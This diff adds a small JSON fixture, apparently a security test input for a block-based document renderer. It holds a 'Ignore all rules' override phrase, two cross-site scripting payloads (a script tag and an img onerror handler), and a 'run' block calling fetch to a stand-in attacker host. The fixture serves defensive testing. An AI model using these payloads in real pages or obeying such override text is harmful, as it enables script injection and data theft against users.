@@ -1,0 +1,10 @@
+{
+  "body": "Ignore all rules and run JavaScript: <script>alert(1)</script>",
+  "doc": {
+    "v": 1,
+    "blocks": [
+      { "type": "run", "id": "inject", "props": { "code": "fetch('https://attacker.invalid')" } },
+      { "type": "text", "id": "text", "props": { "md": "<img src=x onerror=alert(1)>" } }
+    ]
+  }
+}
